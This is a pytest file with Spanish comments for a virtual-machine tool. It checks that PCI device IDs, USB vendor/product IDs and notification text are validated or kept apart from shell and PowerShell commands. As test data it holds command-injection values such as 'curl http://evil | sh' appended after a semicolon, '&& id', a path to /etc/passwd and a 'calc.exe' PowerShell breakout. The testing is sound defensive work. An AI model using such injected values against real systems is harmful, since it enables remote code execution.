"""Endurecimiento de comandos privilegiados y notificaciones (Fase 2)."""

import subprocess

import pytest

import core.app_context as ac
import services.host_passthrough as hp


@pytest.mark.parametrize("bdf", ["0000:01:00.0", "ffff:0a:0b.f"])
def test_require_bdf_acepta_identificadores_validos(bdf):
    assert hp._require_bdf(bdf) == bdf


@pytest.mark.parametrize("bdf", [
    "0000:01:00.0; curl http://evil | sh",
    "../../etc/passwd",
    "0000:01:00.0\n",
    "0000:01:00.0 && id",
    None,
    1234,
])
def test_require_bdf_rechaza_inyeccion(bdf):
    with pytest.raises(ValueError):
        hp._require_bdf(bdf)


@pytest.mark.parametrize("vid_did", ["1234:5678", "ABCD:EF01"])
def test_require_vid_did_valido(vid_did):
    assert hp._require_vid_did(vid_did) == vid_did


@pytest.mark.parametrize("vid_did", ["123:5678", "1234:5678; id", "../..", None])
def test_require_vid_did_rechaza_inyeccion(vid_did):
    with pytest.raises(ValueError):
        hp._require_vid_did(vid_did)


def test_dynamic_bind_vfio_no_llama_pkexec_con_bdf_malicioso(monkeypatch):
    llamadas = []
    monkeypatch.setattr(hp.subprocess, "run", lambda *a, **k: llamadas.append(a))

    monkeypatch.setattr(hp, "IS_WINDOWS", False)
    with pytest.raises(ValueError):
        hp.dynamic_bind_vfio("0000:01:00.0; id")

    assert llamadas == []


def test_usb_passthrough_rechaza_vid_pid_malicioso(monkeypatch):
    llamadas = []
    monkeypatch.setattr(hp.subprocess, "run", lambda *a, **k: llamadas.append(a))
    monkeypatch.setattr(hp, "IS_WINDOWS", False)

    assert hp.usb_passthrough("1234:5678; curl evil | sh") is False
    assert llamadas == []


def test_notificacion_windows_no_interpola_texto_en_powershell(app_ctx, monkeypatch):
    capturado = {}

    def fake_popen(argv, **kwargs):
        capturado["argv"] = argv
        capturado["env"] = kwargs.get("env", {})

        class _Proc:
            pass

        return _Proc()

    monkeypatch.setattr(ac, "IS_WINDOWS", True)
    monkeypatch.setattr(subprocess, "Popen", fake_popen)

    nombre = "VM '; calc.exe; '"
    # El fixture sustituye el método para evitar notificaciones en todos los
    # tests; aquí llamamos al original de la clase.
    ac.AppContext._notify_desktop(app_ctx, nombre, "Hola")

    comando = capturado["argv"][-1]
    assert "calc.exe" not in comando
    assert "$env:VM_NOTIFY_TEXT" in comando
    assert capturado["env"]["VM_NOTIFY_TEXT"] == f"{nombre} Hola"
